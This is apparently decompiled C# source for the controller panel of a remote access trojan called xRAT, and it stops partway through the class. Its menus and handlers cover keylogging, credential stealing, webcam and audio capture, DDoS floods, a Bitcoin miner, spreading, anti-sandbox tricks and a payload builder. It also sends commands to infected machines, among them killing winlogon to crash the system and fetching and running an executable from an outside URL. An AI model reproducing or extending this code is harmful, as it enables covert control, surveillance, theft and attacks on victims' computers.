namespace xRAT
{
    using iniSettings;
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Collections;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.IO;
    using System.Management;
    using System.Net;
    using System.Net.NetworkInformation;
    using System.Net.Sockets;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class Form1 : Form
    {
        [AccessedThroughProperty("AntiAvastSandBoxToolStripMenuItem")]
        private ToolStripMenuItem _AntiAvastSandBoxToolStripMenuItem;
        [AccessedThroughProperty("AttackToolStripMenuItem")]
        private ToolStripMenuItem _AttackToolStripMenuItem;
        [AccessedThroughProperty("BinderToolStripMenuItem")]
        private ToolStripMenuItem _BinderToolStripMenuItem;
        [AccessedThroughProperty("BinderToolStripMenuItem1")]
        private ToolStripMenuItem _BinderToolStripMenuItem1;
        [AccessedThroughProperty("BipSoundToolStripMenuItem")]
        private ToolStripMenuItem _BipSoundToolStripMenuItem;
        [AccessedThroughProperty("BitCoinMinerToolStripMenuItem")]
        private ToolStripMenuItem _BitCoinMinerToolStripMenuItem;
        [AccessedThroughProperty("BotkillToolStripMenuItem")]
        private ToolStripMenuItem _BotkillToolStripMenuItem;
        [AccessedThroughProperty("BSODToolStripMenuItem")]
        private ToolStripMenuItem _BSODToolStripMenuItem;
        [AccessedThroughProperty("Button1")]
        private Button _Button1;
        [AccessedThroughProperty("Button2")]
        private Button _Button2;
        [AccessedThroughProperty("CheckBox1")]
        private CheckBox _CheckBox1;
        [AccessedThroughProperty("ClearTraceHistoryToolStripMenuItem")]
        private ToolStripMenuItem _ClearTraceHistoryToolStripMenuItem;
        [AccessedThroughProperty("CloseCDToolStripMenuItem")]
        private ToolStripMenuItem _CloseCDToolStripMenuItem;
        [AccessedThroughProperty("CloseToolStripMenuItem")]
        private ToolStripMenuItem _CloseToolStripMenuItem;
        [AccessedThroughProperty("ComboBox1")]
        private ComboBox _ComboBox1;
        [AccessedThroughProperty("ComputerNameToolStripMenuItem")]
        private ToolStripMenuItem _ComputerNameToolStripMenuItem;
        [AccessedThroughProperty("ComputerToolStripMenuItem")]
        private ToolStripMenuItem _ComputerToolStripMenuItem;
        [AccessedThroughProperty("ContextMenuStrip1")]
        private ContextMenuStrip _ContextMenuStrip1;
        [AccessedThroughProperty("ContextMenuStrip2")]
        private ContextMenuStrip _ContextMenuStrip2;
        [AccessedThroughProperty("ContextMenuStrip3")]
        private ContextMenuStrip _ContextMenuStrip3;
        [AccessedThroughProperty("CountryToolStripMenuItem")]
        private ToolStripMenuItem _CountryToolStripMenuItem;
        [AccessedThroughProperty("DDOSToolStripMenuItem")]
        private ToolStripMenuItem _DDOSToolStripMenuItem;
        [AccessedThroughProperty("DisableMouseAndKeyboardToolStripMenuItem")]
        private ToolStripMenuItem _DisableMouseAndKeyboardToolStripMenuItem;
        [AccessedThroughProperty("EnableMouseAndKeyboardToolStripMenuItem")]
        private ToolStripMenuItem _EnableMouseAndKeyboardToolStripMenuItem;
        [AccessedThroughProperty("EToolStripMenuItem")]
        private ToolStripMenuItem _EToolStripMenuItem;
        [AccessedThroughProperty("ExitToolStripMenuItem")]
        private ToolStripMenuItem _ExitToolStripMenuItem;
        [AccessedThroughProperty("ExitToolStripMenuItem1")]
        private ToolStripMenuItem _ExitToolStripMenuItem1;
        [AccessedThroughProperty("ExtensionChangerToolStripMenuItem")]
        private ToolStripMenuItem _ExtensionChangerToolStripMenuItem;
        [AccessedThroughProperty("ExtraToolStripMenuItem")]
        private ToolStripMenuItem _ExtraToolStripMenuItem;
        [AccessedThroughProperty("FacebookToolStripMenuItem")]
        private ToolStripMenuItem _FacebookToolStripMenuItem;
        [AccessedThroughProperty("FileManagerToolStripMenuItem")]
        private ToolStripMenuItem _FileManagerToolStripMenuItem;
        [AccessedThroughProperty("FileToolStripMenuItem")]
        private ToolStripMenuItem _FileToolStripMenuItem;
        [AccessedThroughProperty("FixMouseButtonToolStripMenuItem")]
        private ToolStripMenuItem _FixMouseButtonToolStripMenuItem;
        [AccessedThroughProperty("FormGrabberToolStripMenuItem")]
        private ToolStripMenuItem _FormGrabberToolStripMenuItem;
        [AccessedThroughProperty("FreezeToolStripMenuItem")]
        private ToolStripMenuItem _FreezeToolStripMenuItem;
        [AccessedThroughProperty("FunStuffToolStripMenuItem")]
        private ToolStripMenuItem _FunStuffToolStripMenuItem;
        [AccessedThroughProperty("GetIPToolStripMenuItem")]
        private ToolStripMenuItem _GetIPToolStripMenuItem;
        [AccessedThroughProperty("getloggg")]
        private TextBox _getloggg;
        [AccessedThroughProperty("GetRecordToolStripMenuItem")]
        private ToolStripMenuItem _GetRecordToolStripMenuItem;
        [AccessedThroughProperty("HideShowColumsToolStripMenuItem")]
        private ToolStripMenuItem _HideShowColumsToolStripMenuItem;
        [AccessedThroughProperty("HideTaskbarToolStripMenuItem")]
        private ToolStripMenuItem _HideTaskbarToolStripMenuItem;
        [AccessedThroughProperty("IPAdressToolStripMenuItem")]
        private ToolStripMenuItem _IPAdressToolStripMenuItem;
        [AccessedThroughProperty("KeyloggzeToolStripMenuItem")]
        private ToolStripMenuItem _KeyloggzeToolStripMenuItem;
        [AccessedThroughProperty("KillToolStripMenuItem")]
        private ToolStripMenuItem _KillToolStripMenuItem;
        [AccessedThroughProperty("Label2")]
        private Label _Label2;
        [AccessedThroughProperty("LanToolStripMenuItem")]
        private ToolStripMenuItem _LanToolStripMenuItem;
        [AccessedThroughProperty("ListenToolStripMenuItem")]
        private ToolStripMenuItem _ListenToolStripMenuItem;
        [AccessedThroughProperty("ListToolStripMenuItem")]
        private ToolStripMenuItem _ListToolStripMenuItem;
        [AccessedThroughProperty("ListView1")]
        private ListView _ListView1;
        [AccessedThroughProperty("lstClients")]
        private ListView _lstClients;
        [AccessedThroughProperty("MatrixScreenToolStripMenuItem")]
        private ToolStripMenuItem _MatrixScreenToolStripMenuItem;
        [AccessedThroughProperty("MenuStrip1")]
        private MenuStrip _MenuStrip1;
        [AccessedThroughProperty("MessageBoxToolStripMenuItem1")]
        private ToolStripMenuItem _MessageBoxToolStripMenuItem1;
        [AccessedThroughProperty("MsnControlToolStripMenuItem")]
        private ToolStripMenuItem _MsnControlToolStripMenuItem;
        [AccessedThroughProperty("NoipUpdateToolStripMenuItem")]
        private ToolStripMenuItem _NoipUpdateToolStripMenuItem;
        [AccessedThroughProperty("NumberOfConnectionsMaxToolStripMenuItem")]
        private ToolStripMenuItem _NumberOfConnectionsMaxToolStripMenuItem;
        [AccessedThroughProperty("OkToolStripMenuItem")]
        private ToolStripMenuItem _OkToolStripMenuItem;
        [AccessedThroughProperty("OkToolStripMenuItem1")]
        private ToolStripMenuItem _OkToolStripMenuItem1;
        [AccessedThroughProperty("OkToolStripMenuItem2")]
        private ToolStripMenuItem _OkToolStripMenuItem2;
        [AccessedThroughProperty("OkToolStripMenuItem3")]
        private ToolStripMenuItem _OkToolStripMenuItem3;
        [AccessedThroughProperty("OkToolStripMenuItem4")]
        private ToolStripMenuItem _OkToolStripMenuItem4;
        [AccessedThroughProperty("OkToolStripMenuItem5")]
        private ToolStripMenuItem _OkToolStripMenuItem5;
        [AccessedThroughProperty("OkToolStripMenuItem6")]
        private ToolStripMenuItem _OkToolStripMenuItem6;
        [AccessedThroughProperty("OkToolStripMenuItem7")]
        private ToolStripMenuItem _OkToolStripMenuItem7;
        [AccessedThroughProperty("OpenCDToolStripMenuItem")]
        private ToolStripMenuItem _OpenCDToolStripMenuItem;
        [AccessedThroughProperty("OpenWebsiteToolStripMenuItem")]
        private ToolStripMenuItem _OpenWebsiteToolStripMenuItem;
        [AccessedThroughProperty("OSToolStripMenuItem")]
        private ToolStripMenuItem _OSToolStripMenuItem;
        [AccessedThroughProperty("PictureBox1")]
        private PictureBox _PictureBox1;
        [AccessedThroughProperty("PingToolStripMenuItem")]
        private ToolStripMenuItem _PingToolStripMenuItem;
        [AccessedThroughProperty("PlayMusicToolStripMenuItem")]
        private ToolStripMenuItem _PlayMusicToolStripMenuItem;
        [AccessedThroughProperty("PortScannerToolStripMenuItem")]
        private ToolStripMenuItem _PortScannerToolStripMenuItem;
        [AccessedThroughProperty("ProcessesToolStripMenuItem")]
        private ToolStripMenuItem _ProcessesToolStripMenuItem;
        [AccessedThroughProperty("RandomCursorToolStripMenuItem")]
        private ToolStripMenuItem _RandomCursorToolStripMenuItem;
        [AccessedThroughProperty("RandomIconDesktopToolStripMenuItem")]
        private ToolStripMenuItem _RandomIconDesktopToolStripMenuItem;
        [AccessedThroughProperty("RecordAudioToolStripMenuItem")]
        private ToolStripMenuItem _RecordAudioToolStripMenuItem;
        [AccessedThroughProperty("RecordToolStripMenuItem")]
        private ToolStripMenuItem _RecordToolStripMenuItem;
        [AccessedThroughProperty("RefreshToolStripMenuItem")]
        private ToolStripMenuItem _RefreshToolStripMenuItem;
        [AccessedThroughProperty("RemoteDownloadExecuteToolStripMenuItem")]
        private ToolStripMenuItem _RemoteDownloadExecuteToolStripMenuItem;
        [AccessedThroughProperty("RemoteFileManagerToolStripMenuItem")]
        private ToolStripMenuItem _RemoteFileManagerToolStripMenuItem;
        [AccessedThroughProperty("ResHackerToolStripMenuItem")]
        private ToolStripMenuItem _ResHackerToolStripMenuItem;
        [AccessedThroughProperty("RestartToolStripMenuItem")]
        private ToolStripMenuItem _RestartToolStripMenuItem;
        [AccessedThroughProperty("RestartToolStripMenuItem1")]
        private ToolStripMenuItem _RestartToolStripMenuItem1;
        [AccessedThroughProperty("RichTextBox2")]
        private RichTextBox _RichTextBox2;
        [AccessedThroughProperty("RichTextBox3")]
        private RichTextBox _RichTextBox3;
        [AccessedThroughProperty("RichTextBox4")]
        private RichTextBox _RichTextBox4;
        [AccessedThroughProperty("SaveToFileToolStripMenuItem")]
        private ToolStripMenuItem _SaveToFileToolStripMenuItem;
        [AccessedThroughProperty("ServerEditorToolStripMenuItem")]
        private ToolStripMenuItem _ServerEditorToolStripMenuItem;
        [AccessedThroughProperty("ServerToolStripMenuItem")]
        private ToolStripMenuItem _ServerToolStripMenuItem;
        [AccessedThroughProperty("SettingsToolStripMenuItem")]
        private ToolStripMenuItem _SettingsToolStripMenuItem;
        [AccessedThroughProperty("ShowSystemInformationToolStripMenuItem")]
        private ToolStripMenuItem _ShowSystemInformationToolStripMenuItem;
        [AccessedThroughProperty("ShowTaskbarToolStripMenuItem")]
        private ToolStripMenuItem _ShowTaskbarToolStripMenuItem;
        [AccessedThroughProperty("ShowToolStripMenuItem")]
        private ToolStripMenuItem _ShowToolStripMenuItem;
        [AccessedThroughProperty("ShutdownToolStripMenuItem")]
        private ToolStripMenuItem _ShutdownToolStripMenuItem;
        [AccessedThroughProperty("SideTab1")]
        private Control0 _SideTab1;
        [AccessedThroughProperty("SkypeToolStripMenuItem")]
        private ToolStripMenuItem _SkypeToolStripMenuItem;
        [AccessedThroughProperty("SlowlorisToolStripMenuItem")]
        private ToolStripMenuItem _SlowlorisToolStripMenuItem;
        [AccessedThroughProperty("Sock5ToolStripMenuItem")]
        private ToolStripMenuItem _Sock5ToolStripMenuItem;
        [AccessedThroughProperty("SpeakComputerToolStripMenuItem")]
        private ToolStripMenuItem _SpeakComputerToolStripMenuItem;
        [AccessedThroughProperty("SpreadToolStripMenuItem")]
        private ToolStripMenuItem _SpreadToolStripMenuItem;
        [AccessedThroughProperty("SSYNToolStripMenuItem")]
        private ToolStripMenuItem _SSYNToolStripMenuItem;
        [AccessedThroughProperty("StartToolStripMenuItem")]
        private ToolStripMenuItem _StartToolStripMenuItem;
        [AccessedThroughProperty("StartToolStripMenuItem1")]
        private ToolStripMenuItem _StartToolStripMenuItem1;
        [AccessedThroughProperty("StartToolStripMenuItem2")]
        private ToolStripMenuItem _StartToolStripMenuItem2;
        [AccessedThroughProperty("StartToolStripMenuItem3")]
        private ToolStripMenuItem _StartToolStripMenuItem3;
        [AccessedThroughProperty("StartToolStripMenuItem4")]
        private ToolStripMenuItem _StartToolStripMenuItem4;
        [AccessedThroughProperty("StartToolStripMenuItem5")]
        private ToolStripMenuItem _StartToolStripMenuItem5;
        [AccessedThroughProperty("StartToolStripMenuItem6")]
        private ToolStripMenuItem _StartToolStripMenuItem6;
        [AccessedThroughProperty("StatusStrip1")]
        private StatusStrip _StatusStrip1;
        [AccessedThroughProperty("StatusToolStripMenuItem")]
        private ToolStripMenuItem _StatusToolStripMenuItem;
        [AccessedThroughProperty("StealerToolStripMenuItem")]
        private ToolStripMenuItem _StealerToolStripMenuItem;
        [AccessedThroughProperty("StopRecordToolStripMenuItem")]
        private ToolStripMenuItem _StopRecordToolStripMenuItem;
        [AccessedThroughProperty("StopToolStripMenuItem")]
        private ToolStripMenuItem _StopToolStripMenuItem;
        [AccessedThroughProperty("StopToolStripMenuItem1")]
        private ToolStripMenuItem _StopToolStripMenuItem1;
        [AccessedThroughProperty("StopToolStripMenuItem2")]
        private ToolStripMenuItem _StopToolStripMenuItem2;
        [AccessedThroughProperty("StopToolStripMenuItem4")]
        private ToolStripMenuItem _StopToolStripMenuItem4;
        [AccessedThroughProperty("StopToolStripMenuItem5")]
        private ToolStripMenuItem _StopToolStripMenuItem5;
        [AccessedThroughProperty("StopToolStripMenuItem6")]
        private ToolStripMenuItem _StopToolStripMenuItem6;
        [AccessedThroughProperty("SUDPToolStripMenuItem")]
        private ToolStripMenuItem _SUDPToolStripMenuItem;
        [AccessedThroughProperty("SwapMouseButtonToolStripMenuItem")]
        private ToolStripMenuItem _SwapMouseButtonToolStripMenuItem;
        [AccessedThroughProperty("TabPage1")]
        private TabPage _TabPage1;
        [AccessedThroughProperty("TabPage2")]
        private TabPage _TabPage2;
        [AccessedThroughProperty("TabPage3")]
        private TabPage _TabPage3;
        [AccessedThroughProperty("TabPage4")]
        private TabPage _TabPage4;
        [AccessedThroughProperty("TabPage5")]
        private TabPage _TabPage5;
        [AccessedThroughProperty("TCPToolStripMenuItem")]
        private ToolStripMenuItem _TCPToolStripMenuItem;
        [AccessedThroughProperty("TextBox1")]
        private TextBox _TextBox1;
        [AccessedThroughProperty("TextBox2")]
        private TextBox _TextBox2;
        [AccessedThroughProperty("textsteam")]
        private TextBox _textsteam;
        [AccessedThroughProperty("ToolStripMenuItem1")]
        private ToolStripSeparator _ToolStripMenuItem1;
        [AccessedThroughProperty("ToolStripMenuItem2")]
        private ToolStripMenuItem _ToolStripMenuItem2;
        [AccessedThroughProperty("ToolStripSeparator1")]
        private ToolStripSeparator _ToolStripSeparator1;
        [AccessedThroughProperty("ToolStripSeparator10")]
        private ToolStripSeparator _ToolStripSeparator10;
        [AccessedThroughProperty("ToolStripSeparator11")]
        private ToolStripSeparator _ToolStripSeparator11;
        [AccessedThroughProperty("ToolStripSeparator12")]
        private ToolStripSeparator _ToolStripSeparator12;
        [AccessedThroughProperty("ToolStripSeparator13")]
        private ToolStripSeparator _ToolStripSeparator13;
        [AccessedThroughProperty("ToolStripSeparator2")]
        private ToolStripSeparator _ToolStripSeparator2;
        [AccessedThroughProperty("ToolStripSeparator4")]
        private ToolStripSeparator _ToolStripSeparator4;
        [AccessedThroughProperty("ToolStripSeparator5")]
        private ToolStripSeparator _ToolStripSeparator5;
        [AccessedThroughProperty("ToolStripSeparator6")]
        private ToolStripSeparator _ToolStripSeparator6;
        [AccessedThroughProperty("ToolStripSeparator7")]
        private ToolStripSeparator _ToolStripSeparator7;
        [AccessedThroughProperty("ToolStripSeparator8")]
        private ToolStripSeparator _ToolStripSeparator8;
        [AccessedThroughProperty("ToolStripSeparator9")]
        private ToolStripSeparator _ToolStripSeparator9;
        [AccessedThroughProperty("ToolStripSplitButton1")]
        private ToolStripSplitButton _ToolStripSplitButton1;
        [AccessedThroughProperty("ToolStripStatusLabel1")]
        private ToolStripStatusLabel _ToolStripStatusLabel1;
        [AccessedThroughProperty("ToolStripStatusLabel2")]
        private ToolStripStatusLabel _ToolStripStatusLabel2;
        [AccessedThroughProperty("ToolStripTextBox1")]
        private ToolStripTextBox _ToolStripTextBox1;
        [AccessedThroughProperty("ToolStripTextBox10")]
        private ToolStripTextBox _ToolStripTextBox10;
        [AccessedThroughProperty("ToolStripTextBox11")]
        private ToolStripTextBox _ToolStripTextBox11;
        [AccessedThroughProperty("ToolStripTextBox12")]
        private ToolStripTextBox _ToolStripTextBox12;
        [AccessedThroughProperty("ToolStripTextBox13")]
        private ToolStripTextBox _ToolStripTextBox13;
        [AccessedThroughProperty("ToolStripTextBox14")]
        private ToolStripTextBox _ToolStripTextBox14;
        [AccessedThroughProperty("ToolStripTextBox2")]
        private ToolStripTextBox _ToolStripTextBox2;
        [AccessedThroughProperty("ToolStripTextBox3")]
        private ToolStripTextBox _ToolStripTextBox3;
        [AccessedThroughProperty("ToolStripTextBox4")]
        private ToolStripTextBox _ToolStripTextBox4;
        [AccessedThroughProperty("ToolStripTextBox5")]
        private ToolStripTextBox _ToolStripTextBox5;
        [AccessedThroughProperty("ToolStripTextBox6")]
        private ToolStripTextBox _ToolStripTextBox6;
        [AccessedThroughProperty("ToolStripTextBox7")]
        private ToolStripTextBox _ToolStripTextBox7;
        [AccessedThroughProperty("ToolStripTextBox8")]
        private ToolStripTextBox _ToolStripTextBox8;
        [AccessedThroughProperty("ToolStripTextBox9")]
        private ToolStripTextBox _ToolStripTextBox9;
        [AccessedThroughProperty("TracerouteIPToolStripMenuItem")]
        private ToolStripMenuItem _TracerouteIPToolStripMenuItem;
        [AccessedThroughProperty("txtListening")]
        private ToolStripStatusLabel _txtListening;
        [AccessedThroughProperty("UDPToolStripMenuItem")]
        private ToolStripMenuItem _UDPToolStripMenuItem;
        [AccessedThroughProperty("UnfreezeToolStripMenuItem")]
        private ToolStripMenuItem _UnfreezeToolStripMenuItem;
        [AccessedThroughProperty("UsbToolStripMenuItem")]
        private ToolStripMenuItem _UsbToolStripMenuItem;
        [AccessedThroughProperty("UsernameToolStripMenuItem")]
        private ToolStripMenuItem _UsernameToolStripMenuItem;
        [AccessedThroughProperty("VersionToolStripMenuItem")]
        private ToolStripMenuItem _VersionToolStripMenuItem;
        [AccessedThroughProperty("ViewRemoteDesktopToolStripMenuItem")]
        private ToolStripMenuItem _ViewRemoteDesktopToolStripMenuItem;
        [AccessedThroughProperty("VisitWebsiteToolStripMenuItem")]
        private ToolStripMenuItem _VisitWebsiteToolStripMenuItem;
        [AccessedThroughProperty("WebcamToolStripMenuItem")]
        private ToolStripMenuItem _WebcamToolStripMenuItem;
        [AccessedThroughProperty("Win8Progressbar1")]
        private Win8Progressbar _Win8Progressbar1;
        [AccessedThroughProperty("WindowsKeyToolStripMenuItem")]
        private ToolStripMenuItem _WindowsKeyToolStripMenuItem;
        public string actualcountry;
        public string actualip;
        public string actualusername;
        public int autorefreshact;
        public int autorefreshInt;
        public int autosize;
        [AccessedThroughProperty("ToolStripSeparator3")]
        private ToolStripSeparator CbrcOhuJaN;
        [AccessedThroughProperty("ColumnHeader7")]
        private ColumnHeader columnHeader_0;
        [AccessedThroughProperty("ColumnHeader8")]
        private ColumnHeader columnHeader_1;
        [AccessedThroughProperty("lstping")]
        private ColumnHeader columnHeader_10;
        [AccessedThroughProperty("lstipaddress")]
        private ColumnHeader columnHeader_2;
        [AccessedThroughProperty("lstversion")]
        private ColumnHeader columnHeader_3;
        [AccessedThroughProperty("lststatus")]
        private ColumnHeader columnHeader_4;
        [AccessedThroughProperty("lstcpname")]
        private ColumnHeader columnHeader_5;
        [AccessedThroughProperty("lstusername")]
        private ColumnHeader columnHeader_6;
        [AccessedThroughProperty("lstwinprckey")]
        private ColumnHeader columnHeader_7;
        [AccessedThroughProperty("lstopsys")]
        private ColumnHeader columnHeader_8;
        [AccessedThroughProperty("lstcountry")]
        private ColumnHeader columnHeader_9;
        public bool enable;
        private IContainer icontainer_0;
        [AccessedThroughProperty("ImageList1")]
        private ImageList imageList_0;
        public iniSettings.iniSettings inisettings;
        private int int_0;
        private int int_1;
        public bool listening;
        private const long long_0 = 0x101eL;
        private const long long_1 = -2L;
        private Mutex mutex_0;
        [AccessedThroughProperty("NotifyIcon1")]
        private NotifyIcon notifyIcon_0;
        public string password;
        public int popupnotify;
        public int popupvisuel;
        public int port;
        private TcpListener tcpListener_0;
        [AccessedThroughProperty("RichTextBox1")]
        private TextBox textBox_0;
        private Thread thread_0;
        [AccessedThroughProperty("Timer1")]
        private System.Windows.Forms.Timer timer_0;
        [AccessedThroughProperty("txtOnline")]
        private ToolStripStatusLabel YmuEnWtCyp;

        public Form1()
        {
            Class1.QaIGh5M7cuigS();
            base.Load += new EventHandler(this.Form1_Load);
            base.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
            base.SizeChanged += new EventHandler(this.Form1_SizeChanged);
            this.enable = true;
            this.int_0 = 0;
            this.listening = false;
            this.inisettings = new iniSettings.iniSettings(Application.StartupPath + @"\settings.ini");
            this.int_1 = 0;
            this.InitializeComponent();
        }

        public void AddClient(xRAT.Connection client, string[] strings)
        {
            ListViewItem item = new ListViewItem(strings);
            int num = this.ImageList1.Images.Count - 1;
            for (int i = 0; i <= num; i++)
            {
                if (this.ImageList1.Images.Keys[i].ToLower().Contains(strings[9].ToLower()))
                {
                    item.ImageIndex = i;
                    break;
                }
            }
            item.Tag = client;
            this.int_0++;
            this.txtOnline.Text = "Users Online: " + Conversions.ToString(this.int_0);
            this.lstClients.Items.Add(item);
            if ((this.popupnotify == 1) && System.IO.File.Exists(@"data\audio.wav"))
            {
                Class2.Class10_0.Audio.Play(@"data\audio.wav");
            }
            string[] items = new string[3];
            items[0] = Conversions.ToString(DateTime.Now);
            items[1] = strings[0] + " connected.";
            ListViewItem item2 = new ListViewItem(items);
            this.ListView1.Items.Add(item2);
            if (this.autosize == 1)
            {
                this.AppNewAutosizeColumns(this.lstClients);
            }
        }

        private void AntiAvastSandBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Class2.Class4_0.method_0().Show();
        }

        public void AppNewAutosizeColumns(ListView TargetListView)
        {
            long num = TargetListView.Columns.Count - 1;
            for (long i = 0L; i <= num; i += 1L)
            {
                SendMessageA(TargetListView.Handle, 0x101e, (int) i, -2);
            }
        }

        private void AttackToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("STCP|" + this.ToolStripTextBox9.Text + "|" + this.ToolStripTextBox10.Text + "|" + this.ToolStripTextBox11.Text);
            }
        }

        private void BinderToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                Interaction.Shell(@"data\IExpress.exe", AppWinStyle.MinimizedFocus, false, -1);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        private void BipSoundToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("DL|http://mes-images.voila.net/Bip.exe");
            }
        }

        private void BitCoinMinerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                Class2.Class4_0.method_1().Show();
            }
        }

        private void BSODToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("PRCKILL|winlogon");
            }
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            string str2;
            this.TextBox1.Text = Convert.ToBase64String(new ASCIIEncoding().GetBytes(this.TextBox1.Text));
            string path = FileSystem.CurDir() + @"\data\databotphp.exe";
            if (this.CheckBox1.Checked)
            {
                str2 = "okadd";
            }
            else
            {
                str2 = "noadd";
            }
            if (!System.IO.File.Exists(path))
            {
                Application.Exit();
            }
            else
            {
                if (System.IO.File.Exists("botphp.exe"))
                {
                    System.IO.File.Delete("botphp.exe");
                }
                System.IO.File.Copy(path, FileSystem.CurDir() + @"\botphp.exe");
                System.IO.File.AppendAllText(FileSystem.CurDir() + @"\botphp.exe", "Dico" + this.TextBox1.Text + "Dico" + str2);
                this.Win8Progressbar1.Value = Conversions.ToInteger("100");
                MessageBox.Show("botphp.exe is build.", "", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
        }

        private void Button2_Click(object sender, EventArgs e)
        {
        }

        public Image ByteArray2Image(byte[] ByAr)
        {
            Image image2;
            MemoryStream stream = new MemoryStream(ByAr);
            try
            {
                return Image.FromStream(stream);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                image2 = null;
                ProjectData.ClearProjectError();
            }
            return image2;
        }

        private void ClearTraceHistoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Clear Trace !", "", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void CloseCDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("CLOSEDVD");
            }
        }

        private void CloseToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("SCLOSE");
            }
        }

        private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
        }

        private void ComputerNameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstcpname.Width == Conversions.ToDouble("0"))
            {
                this.lstcpname.Width = Conversions.ToInteger("140");
            }
            else
            {
                this.lstcpname.Width = Conversions.ToInteger("0");
            }
        }

        private void CountryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstcountry.Width == Conversions.ToDouble("0"))
            {
                this.lstcountry.Width = Conversions.ToInteger("140");
            }
            else
            {
                this.lstcountry.Width = Conversions.ToInteger("0");
            }
        }

        public string Decrypt(string CodeKey, string DataIn)
        {
            string str = null;
            long num = (long) Math.Round((double) (((double) Strings.Len(DataIn)) / 2.0));
            for (long i = 1L; i <= num; i += 1L)
            {
                int num3 = (int) Math.Round(Conversion.Val("&H" + Strings.Mid(DataIn, (int) ((2L * i) - 1L), 2)));
                int num4 = Strings.Asc(Strings.Mid(CodeKey, (int) ((i % ((long) Strings.Len(CodeKey))) + 1L), 1));
                str = str + Conversions.ToString(Strings.Chr(num3 ^ num4));
            }
            return str;
        }

        public void Dirfile(string dirs, string files, string path)
        {
            string[] strArray = dirs.Split(new char[] { '<' });
            Class2.Class4_0.method_5().ListView1.Items.Clear();
            Class2.Class4_0.method_5().TextBox1.Text = path;
            Class2.Class4_0.method_5().ListView1.Items.Add(@"\", 0);
            Class2.Class4_0.method_5().ListView1.Items.Add("..", 0);
            foreach (string str2 in strArray)
            {
                if (str2 != null)
                {
                    string[] strArray8 = str2.Split(new char[] { '\\' });
                    Class2.Class4_0.method_5().ListView1.Items.Add(strArray8[strArray8.Length - 1], 0);
                }
            }
            foreach (string str3 in files.Split(new char[] { '<' }))
            {
                if (str3 != null)
                {
                    string[] strArray3 = str3.Split(new char[] { ':' });
                    double num2 = Conversions.ToDouble(strArray3[1]) / 1000000.0;
                    string str = "";
                    if (Math.Round(num2, 0) == 0.0)
                    {
                        num2 = Conversions.ToDouble(strArray3[1]) / 1000.0;
                        str = Conversions.ToString(Math.Round(num2, 2)) + " KB";
                    }
                    else if (Math.Round(num2, 0) > 1000.0)
                    {
                        num2 = Conversions.ToDouble(strArray3[1]) / 1000000000.0;
                        str = Conversions.ToString(Math.Round(num2, 2)) + " GB";
                    }
                    else
                    {
                        str = Conversions.ToString(Math.Round(num2, 2)) + " MB";
                    }
                    string[] items = new string[] { strArray3[0], str };
                    ListViewItem item = new ListViewItem(items);
                    if (strArray3[0].EndsWith(".txt".ToLower()))
                    {
                        item.ImageIndex = 2;
                    }
                    else
                    {
                        item.ImageIndex = 1;
                    }
                    Class2.Class4_0.method_5().ListView1.Items.Add(item);
                }
            }
        }

        private void DisableMouseAndKeyboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("APIDISABLE");
            }
        }

        public void Disconnected(xRAT.Connection client)
        {
            this.Invoke(new DisconnectedDelegate(this.Remove), new object[] { client });
        }

        public void DisplayMessage(string msg)
        {
            TextBox box = Class2.Class4_0.method_3().TextBox2;
            box.Text = box.Text + "\r\nSlave: " + msg;
            Class2.Class4_0.method_3().TextBox2.SelectionStart = Class2.Class4_0.method_3().TextBox2.Text.Length;
            Class2.Class4_0.method_3().TextBox2.ScrollToCaret();
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.icontainer_0 != null))
                {
                    this.icontainer_0.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        public void Drives(string drives)
        {
            string[] strArray = drives.Split(new char[] { '>' });
            Class2.Class4_0.method_5().ComboBox1.Items.Clear();
            Class2.Class4_0.method_5().ComboBox1.Text = strArray[0];
            foreach (string str in strArray)
            {
                if (str != null)
                {
                    Class2.Class4_0.method_5().ComboBox1.Items.Add(str);
                }
            }
        }

        private void EnableMouseAndKeyboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("APIENABLE");
            }
        }

        public string Encrypt(string CodeKey, string DataIn)
        {
            string str = null;
            long num = Strings.Len(DataIn);
            for (long i = 1L; i <= num; i += 1L)
            {
                int num3 = Strings.Asc(Strings.Mid(DataIn, (int) i, 1));
                int num4 = Strings.Asc(Strings.Mid(CodeKey, (int) ((i % ((long) Strings.Len(CodeKey))) + 1L), 1));
                int number = num3 ^ num4;
                string expression = Conversion.Hex(number);
                if (Strings.Len(expression) == 1)
                {
                    expression = "0" + expression;
                }
                str = str + expression;
            }
            return str;
        }

